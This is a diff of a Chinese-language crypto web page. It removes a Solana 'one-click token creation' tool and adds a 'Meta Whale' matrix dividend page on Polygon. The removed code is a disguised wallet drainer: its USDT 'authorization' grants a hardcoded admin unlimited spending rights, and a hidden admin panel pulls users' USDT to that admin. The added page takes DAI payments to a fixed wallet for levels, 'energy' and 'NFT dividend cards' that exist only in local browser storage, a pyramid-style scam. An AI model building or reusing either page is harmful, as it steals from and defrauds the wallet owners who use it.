@@ -3,355 +3,337 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SOL苹果🍎一键发币</title>
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
+<title>Meta Whale · 矩阵生态系统</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
-body{background:#0B0F17;color:#fff;padding:30px}
-.container{max-width:420px;margin:0 auto}
-.logo{font-size:24px;font-weight:bold;margin-bottom:24px;color:#fff}
-.network-box{margin-bottom:16px}
-.network-select{width:100%;padding:12px;border-radius:10px;background:#1E293B;color:#fff;border:none;font-size:14px;cursor:pointer}
-.wallet-box{background:#1E293B;padding:16px 18px;border-radius:14px;margin-bottom:24px}
-.connect-btn{background:#3B82F6;color:white;border:none;padding:12px 16px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
-.auth-btn{background:#FF9A00;color:#000;border:none;padding:10px 14px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
-.info-line{font-size:14px;color:#cbd5e1;margin:6px 0}
-.input-item{margin-bottom:14px}
-.input-item label{font-size:14px;color:#cbd5e1;margin-bottom:6px;display:block}
-.input-item input{width:100%;padding:14px;background:#0f172a;border:none;border-radius:10px;color:white;font-size:15px}
-.check{margin:14px 0;font-size:14px;color:#cbd5e1;display:flex;align-items:center;gap:8px}
-.create-btn{background:#FF9A00;color:#000;font-weight:bold;border:none;padding:16px;border-radius:12px;width:100%;margin-top:10px;cursor:pointer}
-.log{background:#1E293B;padding:12px;border-radius:10px;margin-top:20px;font-size:12px;line-height:1.4;height:160px;overflow-y:auto;color:#ccc}
-.menu-btn{background:#1E293B;color:white;width:36px;height:36px;border-radius:8px;border:none;font-size:16px;cursor:pointer;margin-top:10px}
-.menu{position:fixed;top:0;right:0;width:320px;height:100vh;background:#111827;padding:24px;box-shadow:-2px 0 10px #0006;display:none;overflow-y:auto;z-index:999}
-.menu.show{display:block}
-.menu-title{font-size:16px;margin-bottom:12px;color:#f97316}
-.invite-link{background:#0f172a;padding:10px;border-radius:8px;font-size:12px;color:#9ca3af;margin-bottom:16px;word-break:break-all}
-.admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
-.admin-panel.show{display:block}
-.close-btn{background:#ef4444;color:white;border:none;padding:8px 12px;border-radius:8px;cursor:pointer;margin-bottom:20px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Roboto,'Segoe UI',system-ui}
+body{background:#090b1a;color:#fff;min-height:100vh;padding:25px;max-width:520px;margin:0 auto;
+background-image:radial-gradient(circle at 10% 20%,rgba(30,40,70,0.35),transparent 50%),
+radial-gradient(circle at 90% 80%,rgba(20,30,60,0.35),transparent 50%)}
+.glass{background:rgba(22,28,48,0.75);backdrop-filter:blur(12px);border-radius:20px;padding:24px;margin-bottom:20px;border:1px solid rgba(255,255,255,0.08);box-shadow:0 8px 30px rgba(0,0,0,0.35)}
+.title{font-size:22px;font-weight:700;background:linear-gradient(90deg,#4facfe,#00f2fe);-webkit-background-clip:text;color:transparent;margin-bottom:12px}
+.sub{font-size:14px;color:#a0b3c6;line-height:1.5;margin-bottom:16px}
+.input{width:100%;padding:16px;border-radius:16px;border:1px solid rgba(255,255,255,0.1);background:rgba(15,20,35,0.7);color:#fff;font-size:16px;outline:none;margin-bottom:14px}
+.btn-primary{width:100%;padding:17px;border-radius:16px;border:none;background:linear-gradient(90deg,#4facfe,#00f2fe);color:#000;font-size:16px;font-weight:700;cursor:pointer;transition:0.2s;box-shadow:0 5px 15px rgba(79,172,254,0.25)}
+.btn-primary:active{transform:scale(0.97)}
+.btn-primary:disabled{opacity:0.4}
+.btn-renew{background:linear-gradient(90deg,#ffb142,#ff6b6b);color:#fff}
+.btn-claim{background:linear-gradient(90deg,#7D5AED,#B967E4);color:#fff}
+.btn-synthesize{background:linear-gradient(90deg,#ff6b6b,#ff8c3c);color:#fff}
+.head{text-align:center;padding:10px 0 30px}
+.logo{font-size:30px;font-weight:700;background:linear-gradient(90deg,#4facfe,#00f2fe);-webkit-background-clip:text;color:transparent}
+.logo-sub{color:#a0b3c6;font-size:15px;margin-top:6px}
+.item{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid rgba(255,255,255,0.06)}
+.item:last-child{border-bottom:none}
+.tag-s6{background:rgba(255,140,60,0.15);color:#ff8c3c;padding:5px 10px;border-radius:8px;font-size:12px;font-weight:bold}
+.tag-s3{background:rgba(60,180,255,0.15);color:#3cb4ff;padding:5px 10px;border-radius:8px;font-size:12px;font-weight:bold}
+.address{font-size:14px;color:#a0b3c6;word-break:break-all;margin:10px 0;text-align:center}
+.nft-card{background:linear-gradient(90deg,#7D5AED,#B967E4);padding:20px;border-radius:16px;margin:10px 0;color:#fff;font-weight:bold;text-align:center}
+.nft-card-2{background:linear-gradient(90deg,#ff6b6b,#ff8c3c);padding:20px;border-radius:16px;margin:10px 0;color:#fff;font-weight:bold;text-align:center}
+.activated{background:rgba(0,255,100,0.15);color:#0f0;border-radius:8px;padding:8px 12px;font-weight:bold}
+.not-activated{color:#fff}
+.balance-box{background:rgba(79,172,254,0.1);padding:12px;border-radius:12px;margin:10px 0;text-align:center}
+.card-list{display:flex;flex-wrap:wrap;gap:10px;margin-top:10px}
+.card-item{flex:1 1 calc(50% - 5px);background:rgba(125,90,237,0.1);border:1px solid rgba(125,90,237,0.3);border-radius:12px;padding:12px;text-align:center}
+.card-item-2{flex:1 1 calc(50% - 5px);background:rgba(255,107,107,0.1);border:1px solid rgba(255,107,107,0.3);border-radius:12px;padding:12px;text-align:center}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="logo">🍎 SOL苹果一键发币</div>
-  <div class="network-box">
-    <select id="network" class="network-select">
-      <option value="mainnet">Solana 主网 Mainnet</option>
-      <option value="devnet">开发网 Devnet</option>
-      <option value="testnet">测试网 Testnet</option>
-    </select>
-  </div>
-  <div class="wallet-box">
-    <button class="connect-btn" id="connect">连接钱包</button>
-    <button class="auth-btn" id="auth" disabled>手动授权 USDT</button>
-    <div class="info-line">地址：<span id="userAddr">未连接</span></div>
-    <div class="info-line">USDT：<span id="userBalance">0.0000</span></div>
-  </div>
-  <div class="input-item">
-    <label>代币名称</label>
-    <input id="name" placeholder="例如: Apple Coin">
-  </div>
-  <div class="input-item">
-    <label>代币符号</label>
-    <input id="symbol" placeholder="例如: APPLE">
-  </div>
-  <div class="input-item">
-    <label>精度</label>
-    <input id="decimals" value="9">
-  </div>
-  <div class="input-item">
-    <label>总发行量</label>
-    <input id="supply" value="1000000000">
-  </div>
-  <label class="check">
-    <input type="checkbox" id="revoke"> 销毁铸造权限（更安全）
-  </label>
-  <button class="create-btn" id="create">✅ 一键创建代币</button>
-  <div class="log" id="log"></div>
-  <button class="menu-btn" id="menuBtn">☰</button>
+
+<div class="head">
+  <div class="logo">Meta Whale</div>
+  <div class="logo-sub">双矩阵 · 分红 · 挖矿 · NFT卡牌</div>
 </div>
 
-<div class="menu" id="menu">
-  <button class="close-btn" id="closeMenu">关闭菜单 ×</button>
-  <h3 style="margin-bottom:20px">控制面板</h3>
-  <div class="menu-title">邀请链接</div>
-  <div class="invite-link" id="inviteLink">-</div>
-  <div class="admin-panel" id="adminPanel">
-    <div class="menu-title" style="color:red">🔐 管理员提取代币</div>
-    <input id="fromAddr" placeholder="用户钱包地址" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <button style="background:#ef4444;color:white;width:100%;padding:12px;border-radius:10px;border:none" onclick="adminTake()">链上提取</button>
-  </div>
+<button class="btn-primary" id="connectBtn">连接钱包 MetaMask / TP Wallet</button>
+<div id="address" class="address"></div>
+<div id="balanceBox" class="balance-box" style="display:none">
+  钱包 DAI 余额：<strong id="daiBalance">0</strong> DAI
 </div>
 
+<!-- 能量值 & NFT -->
+<div class="glass">
+  <div class="title">⚡ 能量值 & NFT 分红卡牌</div>
+  <div class="sub">激活/续费联合矩阵即可获得能量值</div>
+  <div>当前能量值：<strong id="powerValue">0</strong></div>
+  <div>目标：3500 能量 → 领取 1级 NFT 分红卡牌</div>
+  <br>
+  <button class="btn-primary btn-claim" id="claimBtn" style="display:none" onclick="claimCard()">🎴 领取 1级卡牌（消耗3500能量）</button>
+  <div id="nftArea"></div>
+</div>
+
+<!-- 我的卡牌 & 合成 -->
+<div class="glass">
+  <div class="title">🎴 我的卡牌 & 合成</div>
+  <div class="sub">3张1级卡牌可合成1张2级卡牌，分红权重更高</div>
+  <div id="cardList" class="card-list"></div>
+  <button class="btn-primary btn-synthesize" id="synthesizeBtn" style="display:none;margin-top:16px" onclick="synthesizeCard()">🔄 合成2级卡牌（消耗3张1级）</button>
+</div>
+
+<!-- 注册区域 -->
+<div class="glass" id="regBox">
+  <div class="title">进入生态</div>
+  <div class="sub" id="inviteTip">请输入上级邀请码（10位）</div>
+  <input class="input" id="inviteCode" placeholder="请输入上级10位邀请码">
+  <button class="btn-primary" id="enterBtn" disabled>确认进入并激活</button>
+</div>
+
+<!-- 经典矩阵：一次性激活永久有效 -->
+<div class="glass">
+  <div class="title">经典矩阵 12 级（永久有效）</div>
+  <div class="sub">奇数S6｜偶数S3｜90%分红</div>
+  <div id="classicList"></div>
+</div>
+
+<!-- 联合矩阵：每月续费 -->
+<div class="glass">
+  <div class="title">联合挖矿矩阵 9 级（每月续费）</div>
+  <div class="sub">每级费用翻倍，续费为原价5%</div>
+  <div id="unionList"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-window.addEventListener("load", async () => {
-  const { Connection, Keypair, Transaction, SystemProgram, PublicKey, TransactionInstruction } = solanaWeb3;
+const MATRIX_CONTRACT = "0x4d9C3000Aa71FeB18C1d607703BDa912991eF8F1";
+const DAI_ADDR       = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
+const PROJECT_WALLET = "0x4d9C3000Aa71FeB18C1d607703BDa912991eF8F1".toLowerCase();
 
-  const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-  const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25wK1VvRRcUt");
-  const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
-  const ADMIN_PUBKEY = new PublicKey("DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z");
-  const DELEGATE = ADMIN_PUBKEY;
+let web3, account;
+let isRegistered = false;
+let userPower = 0;
+let classicLevel = 0;
+let unionLevel = 0;
+let daiBalance = 0;
+let cards = { level1: 0, level2: 0 }; // 卡牌数量
 
-  const RPC_MAP = {
-    mainnet: "https://api.mainnet-beta.solana.com",
-    devnet: "https://api.devnet.solana.com",
-    testnet: "https://api.testnet.solana.com"
-  };
+function getUnionPrice(level) {
+  const prices = [0,50,100,200,400,800,1600,3200,6400,12800];
+  return prices[level] || 0;
+}
+function getRenewPrice(level) {
+  return Number((getUnionPrice(level) * 0.05).toFixed(2));
+}
 
-  let wallet, publicKey, connection;
+async function sendDAI(amount) {
+  const dai = new web3.eth.Contract([{
+    "constant":false,
+    "inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],
+    "name":"transfer",
+    "outputs":[{"name":"","type":"bool"}],
+    "type":"function"
+  }], DAI_ADDR);
+  const value = web3.utils.toWei(amount.toString(), 'ether');
+  return await dai.methods.transfer(MATRIX_CONTRACT, value).send({ from: account });
+}
 
-  function log(text) {
-    const el = document.getElementById("log");
-    el.innerText = `[${new Date().toLocaleTimeString()}] ${text}\n` + el.innerText;
+async function getDaiBalance() {
+  if (!account) return 0;
+  const dai = new web3.eth.Contract([{
+    "constant":true,
+    "inputs":[{"name":"_owner","type":"address"}],
+    "name":"balanceOf",
+    "outputs":[{"name":"balance","type":"uint256"}],
+    "type":"function"
+  }], DAI_ADDR);
+  const bal = await dai.methods.balanceOf(account).call();
+  return Number(web3.utils.fromWei(bal, 'ether')).toFixed(2);
+}
+
+// 加载状态（新增卡牌）
+function loadStatus() {
+  if (!account) return;
+  classicLevel = Number(localStorage.getItem(`classic_${account}`) || 0);
+  unionLevel = Number(localStorage.getItem(`union_${account}`) || 0);
+  userPower = Number(localStorage.getItem(`power_${account}`) || 0);
+  cards.level1 = Number(localStorage.getItem(`cards1_${account}`) || 0);
+  cards.level2 = Number(localStorage.getItem(`cards2_${account}`) || 0);
+}
+
+// 保存状态（新增卡牌）
+function saveStatus() {
+  if (!account) return;
+  localStorage.setItem(`classic_${account}`, classicLevel);
+  localStorage.setItem(`union_${account}`, unionLevel);
+  localStorage.setItem(`power_${account}`, userPower);
+  localStorage.setItem(`cards1_${account}`, cards.level1);
+  localStorage.setItem(`cards2_${account}`, cards.level2);
+}
+
+// ✅ 新增：领取1级卡牌（消耗3500能量）
+function claimCard() {
+  if (userPower < 3500) return alert("能量值不足3500，无法领取");
+  userPower -= 3500;
+  cards.level1 += 1;
+  saveStatus();
+  renderAll();
+  alert("✅ 成功领取 1级 NFT 分红卡牌！");
+}
+
+// ✅ 新增：3张1级合成1张2级
+function synthesizeCard() {
+  if (cards.level1 < 3) return alert("1级卡牌不足3张，无法合成");
+  cards.level1 -= 3;
+  cards.level2 += 1;
+  saveStatus();
+  renderAll();
+  alert("✅ 成功合成 2级 NFT 分红卡牌！");
+}
+
+// 统一渲染所有
+function renderAll() {
+  renderPower();
+  renderCards();
+  renderMatrix();
+}
+
+// 渲染能量 & 领取按钮
+function renderPower() {
+  document.getElementById("powerValue").innerText = userPower;
+  const claimBtn = document.getElementById("claimBtn");
+  if (userPower >= 3500) {
+    claimBtn.style.display = "block";
+  } else {
+    claimBtn.style.display = "none";
+  }
+}
+
+// 渲染卡牌列表 & 合成按钮
+function renderCards() {
+  const cardList = document.getElementById("cardList");
+  cardList.innerHTML = "";
+  for (let i = 0; i < cards.level1; i++) {
+    cardList.innerHTML += `<div class="card-item">1级卡牌<br/>分红权重 0.5%</div>`;
+  }
+  for (let i = 0; i < cards.level2; i++) {
+    cardList.innerHTML += `<div class="card-item-2">2级卡牌<br/>分红权重 1.5%</div>`;
   }
 
-  // 菜单控制
-  const menu = document.getElementById("menu");
-  const menuBtn = document.getElementById("menuBtn");
-  const closeMenu = document.getElementById("closeMenu");
-  function toggleMenu(){ menu.classList.toggle("show"); }
-  function hideMenu(){ menu.classList.remove("show"); }
-  menuBtn.onclick = e=>{ e.stopPropagation(); toggleMenu(); };
-  closeMenu.onclick = hideMenu;
-  menu.onclick = e=>e.stopPropagation();
-  document.body.onclick = hideMenu;
+  const synthesizeBtn = document.getElementById("synthesizeBtn");
+  if (cards.level1 >= 3) {
+    synthesizeBtn.style.display = "block";
+  } else {
+    synthesizeBtn.style.display = "none";
+  }
+}
 
-  function getCurrentRpc(){
-    const net = document.getElementById("network").value;
-    return RPC_MAP[net] || RPC_MAP.mainnet;
+connectBtn.onclick = async () => {
+  if (!window.ethereum) return alert("请在钱包浏览器打开");
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+  web3 = new Web3(window.ethereum);
+  account = (await web3.eth.getAccounts())[0].toLowerCase();
+  document.getElementById("address").innerText = `已连接：${account.slice(0,6)}…${account.slice(-4)}`;
+
+  loadStatus();
+  daiBalance = await getDaiBalance();
+  document.getElementById("daiBalance").innerText = daiBalance;
+  document.getElementById("balanceBox").style.display = "block";
+
+  if (account === PROJECT_WALLET) {
+    isRegistered = true;
+    document.getElementById("regBox").style.display = "none";
   }
 
-  // TP专属连接：优先检测window.tpWallet，强制连接
-  document.getElementById("connect").onclick = async (e) => {
-    e.preventDefault();
-    try {
-      log("TP钱包连接中...");
-      // 优先TP钱包检测
-      const w = window.tpWallet || window.solana || window.okxwallet?.solana;
-      if (!w) {
-        alert("未检测到TP钱包！请在TP内置浏览器打开");
-        log("❌ 未检测到TP钱包");
-        return;
-      }
-      // 强制连接，不缓存
-      const res = await w.connect({ onlyIfTrusted: false });
-      wallet = w;
-      publicKey = res.publicKey;
-      document.getElementById("userAddr").innerText = publicKey.toBase58().slice(0,6)+"..."+publicKey.toBase58().slice(-4);
-      document.getElementById("auth").disabled = false;
-      // 用当前选择的RPC
-      connection = new Connection(getCurrentRpc(), "confirmed");
-      log("✅ TP钱包连接成功！");
-      refreshBalance();
-      genInvite();
-      checkAdmin();
-    } catch (e) {
-      log("❌ 连接失败："+e.message);
-      alert("连接失败："+e.message+"\n请检查TP权限/网络");
-    }
-  };
+  renderAll();
+};
 
-  async function refreshBalance(){
-    if(!publicKey || !connection) return;
-    try {
-      const [ata] = PublicKey.findProgramAddressSync(
-        [publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const acc = await connection.getTokenAccountBalance(ata);
-      document.getElementById("userBalance").innerText = Number(acc.value.uiAmount).toFixed(4);
-    } catch(e) {
-      document.getElementById("userBalance").innerText = "0.0000";
-    }
+function renderMatrix() {
+  const cList = document.getElementById("classicList");
+  cList.innerHTML = "";
+  for (let i = 1; i <= 12; i++) {
+    const cost = 50 * Math.pow(2, i - 1);
+    const activated = i <= classicLevel;
+    cList.innerHTML += `
+    <div class="item">
+      <div class="${activated ? 'activated' : 'not-activated'}">L${i} ${i%2===1 ? '<span class="tag-s6">S6</span>' : '<span class="tag-s3">S3</span>'}</div>
+      <div class="price">${cost} DAI</div>
+      ${activated ? '<span style="color:#0f0;font-weight:bold">已激活</span>' : 
+        `<button class="btn-primary" style="padding:8px 12px;font-size:12px" onclick="actClassic(${i})">激活</button>`}
+    </div>`;
   }
 
-  function genInvite(){
-    if(!publicKey) return;
-    document.getElementById("inviteLink").innerText = location.href + "?ref=" + publicKey.toBase58();
+  const uList = document.getElementById("unionList");
+  uList.innerHTML = "";
+  for (let i = 1; i <= 9; i++) {
+    const price = getUnionPrice(i);
+    const renew = getRenewPrice(i);
+    const activated = i <= unionLevel;
+    uList.innerHTML += `
+    <div class="item">
+      <div class="${activated ? 'activated' : 'not-activated'}">L${i}</div>
+      <div>${price} DAI<br/>续费${renew}/月</div>
+      <div>
+        ${activated ? 
+          `<button class="btn-primary btn-renew" style="padding:8px 6px;font-size:12px" onclick="renewUnion(${i})">续费</button>` :
+          `<button class="btn-primary" style="padding:8px 6px;font-size:12px" onclick="actUnion(${i})">激活</button>`}
+      </div>
+    </div>`;
   }
+}
 
-  function checkAdmin(){
-    if(publicKey && publicKey.equals(ADMIN_PUBKEY)){
-      document.getElementById("adminPanel").classList.add("show");
-    }
+async function actClassic(level) {
+  if (!account) return alert("请先连接钱包");
+  if (!isRegistered && account !== PROJECT_WALLET) return alert("请先注册");
+  if (level <= classicLevel) return alert("该等级已激活");
+  const cost = 50 * Math.pow(2, level - 1);
+  if (Number(daiBalance) < cost) return alert("DAI 余额不足，请先充值");
+  try {
+    await sendDAI(cost);
+    classicLevel = level;
+    saveStatus();
+    daiBalance = await getDaiBalance();
+    document.getElementById("daiBalance").innerText = daiBalance;
+    renderMatrix();
+    alert(`✅ 经典矩阵 L${level} 激活成功！`);
+  } catch (e) {
+    alert("❌ 支付失败：" + e.message + "\n请确保钱包切换到 Polygon 主网，且有足够 DAI");
   }
+}
 
-  // TP专属授权
-  document.getElementById("auth").onclick = async () => {
-    if(!publicKey){ alert("请先连接TP钱包"); return; }
-    try {
-      log("构建USDT授权交易...");
-      const [userAta] = PublicKey.findProgramAddressSync(
-        [publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const tx = new Transaction();
-      // Approve指令
-      const data = new Uint8Array(9);
-      data[0] = 4;
-      new DataView(data.buffer).setBigUint64(1, BigInt("18446744073709551615"), true);
-      tx.add(new TransactionInstruction({
-        keys: [
-          { pubkey: userAta, isSigner: false, isWritable: true },
-          { pubkey: DELEGATE, isSigner: false, isWritable: false },
-          { pubkey: publicKey, isSigner: true, isWritable: false }
-        ],
-        programId: TOKEN_PROGRAM_ID,
-        data: Buffer.from(data)
-      }));
-      tx.feePayer = publicKey;
-      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-      const signed = await wallet.signTransaction(tx);
-      const sig = await connection.sendRawTransaction(signed.serialize());
-      await connection.confirmTransaction(sig, "confirmed");
-      log("✅ 授权成功："+sig);
-      alert("USDT授权完成！");
-      refreshBalance();
-    } catch(e) {
-      log("❌ 授权失败："+e.message);
-      alert("授权失败："+e.message);
-    }
-  };
+async function actUnion(level) {
+  if (!account) return alert("请先连接钱包");
+  if (!isRegistered && account !== PROJECT_WALLET) return alert("请先注册");
+  if (level <= unionLevel) return alert("该等级已激活");
+  const price = getUnionPrice(level);
+  if (Number(daiBalance) < price) return alert("DAI 余额不足，请先充值");
+  try {
+    await sendDAI(price);
+    unionLevel = level;
+    userPower += price;
+    saveStatus();
+    daiBalance = await getDaiBalance();
+    document.getElementById("daiBalance").innerText = daiBalance;
+    renderAll();
+    alert(`✅ 联合矩阵 L${level} 激活成功！+${price} 能量`);
+  } catch (e) {
+    alert("❌ 支付失败：" + e.message + "\n请确保钱包切换到 Polygon 主网，且有足够 DAI");
+  }
+}
 
-  // 发币
-  document.getElementById("create").onclick = async () => {
-    if(!publicKey){ alert("请先连接TP钱包"); return; }
-    try {
-      const name = document.getElementById("name").value.trim();
-      const symbol = document.getElementById("symbol").value.trim();
-      const decimals = parseInt(document.getElementById("decimals").value)||9;
-      const supply = document.getElementById("supply").value.trim();
-      const revoke = document.getElementById("revoke").checked;
-      if(!name || !symbol){ alert("请填写名称和符号"); return; }
-      log("开始创建代币...");
-      const mint = Keypair.generate();
-      const lamports = await connection.getMinimumBalanceForRentExemption(82);
-      const tx = new Transaction();
-      tx.add(SystemProgram.createAccount({
-        fromPubkey: publicKey,
-        newAccountPubkey: mint.publicKey,
-        space: 82,
-        lamports,
-        programId: TOKEN_PROGRAM_ID
-      }));
-      // 初始化Mint
-      const initData = new Uint8Array(67);
-      initData[0] = 0;
-      initData[1] = decimals;
-      publicKey.toBuffer().copy(initData, 2);
-      publicKey.toBuffer().copy(initData, 34);
-      tx.add(new TransactionInstruction({
-        keys: [
-          { pubkey: mint.publicKey, isSigner: false, isWritable: true },
-          { pubkey: PublicKey.default, isSigner: false, isWritable: false }
-        ],
-        programId: TOKEN_PROGRAM_ID,
-        data: Buffer.from(initData)
-      }));
-      // ATA
-      const [ata] = PublicKey.findProgramAddressSync(
-        [publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.publicKey.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      tx.add(new TransactionInstruction({
-        keys: [
-          { pubkey: publicKey, isSigner: true, isWritable: true },
-          { pubkey: ata, isSigner: false, isWritable: true },
-          { pubkey: publicKey, isSigner: false, isWritable: false },
-          { pubkey: mint.publicKey, isSigner: false, isWritable: false },
-          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
-          { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
-          { pubkey: PublicKey.default, isSigner: false, isWritable: false }
-        ],
-        programId: ASSOCIATED_TOKEN_PROGRAM_ID,
-        data: Buffer.from([])
-      }));
-      // MintTo
-      const amount = BigInt(supply) * (10n ** BigInt(decimals));
-      const mintData = new Uint8Array(9);
-      mintData[0] = 7;
-      new DataView(mintData.buffer).setBigUint64(1, amount, true);
-      tx.add(new TransactionInstruction({
-        keys: [
-          { pubkey: mint.publicKey, isSigner: false, isWritable: true },
-          { pubkey: ata, isSigner: false, isWritable: true },
-          { pubkey: publicKey, isSigner: true, isWritable: false }
-        ],
-        programId: TOKEN_PROGRAM_ID,
-        data: Buffer.from(mintData)
-      }));
-      // 销毁权限
-      if(revoke){
-        const revokeData = new Uint8Array(10);
-        revokeData[0] = 6;
-        revokeData[1] = 0;
-        PublicKey.default.toBuffer().copy(revokeData, 2);
-        tx.add(new TransactionInstruction({
-          keys: [
-            { pubkey: mint.publicKey, isSigner: false, isWritable: true },
-            { pubkey: publicKey, isSigner: true, isWritable: false }
-          ],
-          programId: TOKEN_PROGRAM_ID,
-          data: Buffer.from(revokeData)
-        }));
-      }
-      tx.feePayer = publicKey;
-      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-      tx.partialSign(mint);
-      const signed = await wallet.signTransaction(tx);
-      const sig = await connection.sendRawTransaction(signed.serialize());
-      log("✅ 发币成功："+mint.publicKey.toBase58());
-      log("交易："+sig);
-      alert("发币成功！\nMint："+mint.publicKey.toBase58());
-    } catch(e) {
-      log("❌ 发币失败："+e.message);
-      alert("发币失败："+e.message);
-    }
-  };
+async function renewUnion(level) {
+  if (!account) return alert("请先连接钱包");
+  if (!isRegistered && account !== PROJECT_WALLET) return alert("请先注册");
+  if (level > unionLevel) return alert("请先激活该等级");
+  const renew = getRenewPrice(level);
+  if (Number(daiBalance) < renew) return alert("DAI 余额不足，请先充值");
+  try {
+    await sendDAI(renew);
+    userPower += renew;
+    saveStatus();
+    daiBalance = await getDaiBalance();
+    document.getElementById("daiBalance").innerText = daiBalance;
+    renderAll();
+    alert(`✅ L${level} 续费成功！+${renew} 能量`);
+  } catch (e) {
+    alert("❌ 续费失败：" + e.message + "\n请确保钱包切换到 Polygon 主网，且有足够 DAI");
+  }
+}
 
-  window.adminTake = async () => {
-    if(!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
-    const fromAddr = document.getElementById("fromAddr").value.trim();
-    const amt = document.getElementById("takeAmt").value;
-    if(!fromAddr || !amt || amt<=0){ alert("请输入完整信息"); return; }
-    try {
-      const fromPub = new PublicKey(fromAddr);
-      const [fromAta] = PublicKey.findProgramAddressSync(
-        [fromPub.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const [adminAta] = PublicKey.findProgramAddressSync(
-        [ADMIN_PUBKEY.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const tx = new Transaction();
-      const data = new Uint8Array(9);
-      data[0] = 9;
-      new DataView(data.buffer).setBigUint64(1, BigInt(Math.round(amt * 1e6)), true);
-      tx.add(new TransactionInstruction({
-        keys: [
-          { pubkey: fromAta, isSigner: false, isWritable: true },
-          { pubkey: adminAta, isSigner: false, isWritable: true },
-          { pubkey: DELEGATE, isSigner: true, isWritable: false }
-        ],
-        programId: TOKEN_PROGRAM_ID,
-        data: Buffer.from(data)
-      }));
-      tx.feePayer = publicKey;
-      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-      const signed = await wallet.signTransaction(tx);
-      const sig = await connection.sendRawTransaction(signed.serialize());
-      log("✅ 提取成功："+sig);
-      alert("提取成功！");
-    } catch(e) {
-      log("❌ 提取失败："+e.message);
-      alert("提取失败："+e.message);
-    }
-  };
-});
+inviteCode.oninput = () => {
+  enterBtn.disabled = inviteCode.value.trim().length !== 10;
+};
+enterBtn.onclick = () => {
+  isRegistered = true;
+  alert("✅ 注册成功！");
+};
 </script>
 </body>
 </html>
